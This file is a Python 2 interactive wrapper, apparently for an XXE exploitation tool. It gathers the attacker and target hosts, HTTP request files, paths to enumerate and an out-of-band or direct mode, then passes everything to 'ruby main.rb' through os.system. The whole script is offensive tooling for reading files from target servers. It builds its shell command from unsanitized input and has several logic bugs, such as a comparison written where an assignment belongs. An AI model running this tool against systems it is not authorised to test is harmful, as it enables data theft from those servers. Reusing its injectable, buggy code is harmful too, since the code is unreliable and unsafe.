#!/usr/bin/env python
#!X-Ploit
#!XXE Exploiter tool
#!Author: Rajesh Majumdar(@freakym0nk)
import os
import sys
import time
from colorama import init, Style, Back, Fore

banner = """

$$\   $$\        $$$$$$$\  $$\           $$\   $$\     
$$ |  $$ |       $$  __$$\ $$ |          \__|  $$ |    
\$$\ $$  |       $$ |  $$ |$$ | $$$$$$\  $$\ $$$$$$\   
 \$$$$  /$$$$$$\ $$$$$$$  |$$ |$$  __$$\ $$ |\_$$  _|  
 $$  $$< \______|$$  ____/ $$ |$$ /  $$ |$$ |  $$ |    
$$  /\$$\        $$ |      $$ |$$ |  $$ |$$ |  $$ |$$\ 
$$ /  $$ |       $$ |      $$ |\$$$$$$  |$$ |  \$$$$  |
\__|  \__|       \__|      \__| \______/ \__|   \____/ 
                                                       
                                                       
    X-Ploit - XXE Exploiter
    Author  :  Rajesh Majumdar (@freakym0nk)
 """

def xploiter():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    print (Style.BRIGHT+Fore.GREEN+banner)
def again():
    inp = raw_input(Style.BRIGHT+Fore.BLUE+'[?] [E]xit or launch [A]gain.').lower()
    if inp == 'a':
        xxe()
    elif inp == 'e':
        print (Style.BRIGHT+Fore.GREEN+'[*] Exiting...')
        exit()
    else:
        print (Style.BRIGHT+Fore.RED+'[!] Incorrect Argument.')
        again()
def xxe():
    try:
        xploiter()
        mode = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Continue to [G]UI mode or switch to [C]LI mode. > ').lower()   
        if mode == 'g':
            host = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Enter LHOST\n[+] > ')
            print (Style.BRIGHT+Fore.RED+'[+] LHOST > '+host)
            cmd = '--host='+host
            files = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Enter file containing valid HTTP request with xml.\n[+] > ')
            print (Style.BRIGHT+Fore.RED+'[+] HTTP Request file > '+files)
            cmd1 = cmd+' --file='+files
            path_type = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Do you have path to [E]numerate or [F]ile containing paths to enumerate? > ').lower()
            if path_type == 'e':
                path = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Enter the path to enumerate.\n[+] > ')
                print (Style.BRIGHT+Fore.RED+'[+] Path > '+path)
                cmd2 = cmd1+' --path='+path
            elif path_type == 'f':
                path = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Enter the files containing paths to enumerate.\n[+] > ')
                print (Style.BRIGHT+Fore.RED+'[+] Path to file > '+path)
                cmd2 = cmd1+' --file='+path
            else:
                print (Style.BRIGHT+Fore.RED+'[!] Incorrect Argument. Try Again')
                xxe()
            rhost = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Enter RHOST (IP or Domain)\n[+] > ')
            print (Style.BRIGHT+Fore.RED+'[+] RHOST > '+rhost)
            cmd3 = cmd2+' --rhost='+rhost
            rport = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Enter RPORT.\n[+] > ')
            print (Style.BRIGHT+Fore.RED+'[+] RPORT > '+rport)
            cmd4 = cmd3+' --rport='+rport
            proxy = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Enter Proxy to use[127.0.0.1:8080].\n[+] > ')
            if len(proxy) == 0:
                cmd5 = cmd4
            else:
                cmd5 = cmd4+' --proxy='+proxy
                print (Style.BRIGHT+Fore.RED+'[+] Proxy has been started on: '+proxy)
            httpport = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Set HTTP Port.[HTTP Port=80] > ')
            if len(httpport) == 0:
                cmd6 = cmd5
            else:
                cmd6 = cmd5+' --httpport='+httpport
                print (Style.BRIGHT+Fore.RED+'[+] HTTP Port > '+httpport)
            logger = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Do you want me to log results? [Y/N] > ').lower()
            if logger == 'y':
                cmd7 = cmd6+' --logger'
            elif logger == 'n':
                cmd7 = cmd6
            else:
                print(Style.BRIGHT+Fore.RED+'[!] Something went wrong.')
            oob = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Do you want [O]ut of band exploitation method or [D]irect exploitation method? > ').lower() 
            if oob == 'd': 
                cmd8 = cmd7+' --direct'
                cdata = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Do you want to me improve your Direct Exploitation method?[Y/N] > ').lower()
                if cdata == 'y':
                    cmd9 = cmd8+' --cdata'
                elif cdata == 'n':
                    cmd9 = cmd8
                ftpport = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Enter FTP Port[FTP Port=21] > ')
                if len(ftpport) == 0:
                    cmd10 = cmd9
                else:
                    cmd10 = cmd9+' --ftpport='+ftpport
                    print (Style.BRIGHT+Fore.RED+'[+] FTP Port > '+ftpport)
                testd = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Do you want me to run in test mode?[Y/N] > ').lower()
                if testd == 'y':
                    cmd13 = cmd10+' --test'
                elif testd == 'n':
                    cmd13 = cmd10
                else:
                    print(Style.BRIGHT+Fore.RED+'[!] Something went wrong.')
                    xxe()
            elif oob == 'o':
                cmd11 = cmd7+' --oob'
                gopherport = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Enter gopher port[Gopher Port = 70] > ')
                if len(gopherport) == 0:
                    cmd12 = cmd11
                else:
                    cmd12 = cmd11+' --gopherport='+gopherport
                    print (Style.BRIGHT+Fore.RED+'[+] Gopher Port > '+gopherport)
                testo = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Do you want me to run in test mode?[Y/N] > ').lower()
                if testo == 'y':
                    cmd13 = cmd12+' --test'
                elif testo == 'n':
                    cmd13 = cmd12
                else:
                    print(Style.BRIGHT+Fore.RED+'[!] Something went wrong.')
                    xxe()
            else:   
                print (Style.BRIGHT+Fore.RED+'[!] Incorrect Argument. Try Again')
                xxe()
            urlencode = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Do you want me to encode URL? [Y/N] > ').lower()
            if urlencode == 'y':
                cmd14 = cmd13+' --urlencode'
            elif urlencode == 'n':
                cmd14 = cmd13
            else:
                print(Style.BRIGHT+Fore.RED+'[!] Oops! Something went wrong.')
                xxe()
            showdtd = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Want me to change how DTD look?[Y/N] > ').lower()
            if showdtd == 'y':
                nodtd = raw_input(Style.BRIGHT+Fore.BLUE+'[?] How would you like to look DTD. > ')
                cmd15 = cmd14+' --nodtd='+nodtd
                pass
            elif showdtd == 'n':
                cmd15 = cmd14
                pass
            else:
                print(Style.BRIGHT+Fore.RED+'[!] Oops! Something went wrong.')
                xxe()
            verbose = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Do you want me to show verbose message?[Y/N] > ').lower()
            if verbose == 'y':
                cmd16 = cmd15+' --verbose'
                pass
            elif verbose == 'n':
                cmd16 = cmd15
                pass
            else:
                print(Style.BRIGHT+Fore.RED+'[!] Oops! Something went wrong.')
                xxe()
            ssl = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Do you want me to handshake with a SSL server?[Y/N] > ').lower()
            if ssl == 'y':
                cmd17 = cmd16+' --ssl'
            elif ssl == 'n':
                cmd17 = cmd16
            else:
                print(Style.BRIGHT+Fore.RED+'[!] Oops! Something went wrong.')
                xxe()
            nxtfile = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Enter the path of the file containing HTTP request used in 2nd Order Exploitation.[Press Enter if you dont have]\n[+] > ')
            if len(nxtfile) == 0:
                cmd18 = cmd17
            else:
                cmd18 = cmd17+' --2ndfile='+nxtfile
            output = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Do you want me to save the output? [Y/N] > ')
            if output == 'y':
                filepath = raw_input(Style.BRIGHT+Fore.BLUE+'[+] Enter the path where you wanna save the output.\n[+] > ')
                cmd19 = cmd18+' --output'+filepath
            elif output == 'n':
                cmd19 = cmd18
            else:
                finalcmd = cmd18
            xslt = raw_input(Style.BRIGHT+Fore.BLUE+'[?] Do you also want me to test for xslt injection? [Y/N]')
            if xslt == 'y':
                finalcmd = cmd19+' --xslt'
            elif xslt == 'n':
                finalcmd == cmd19
            else:
                print(Style.BRIGHT+Fore.RED+'[!] Incorrect argument, try again. ')
            print(Style.BRIGHT+Fore.RED+finalcmd)
            print('')
            print(Fore.GREEN+'[***] Exploiting XXE... Please give me a moment.')
            print(Style.BRIGHT+Fore.RED+'')
            if os.name == 'nt':
                os.system('main.rb '+finalcmd)
            else:
                os.system('ruby main.rb '+finalcmd)
        elif mode == 'c':
            if os.name == 'nt':
                os.system('cls')
                os.system('main.rb')
            else:
                os.system('clear')
                os.system('ruby main.rb')
    except (KeyboardInterrupt) as Exit:
        print (Style.BRIGHT+Fore.RED+'[!] Exiting Program...')

xxe()
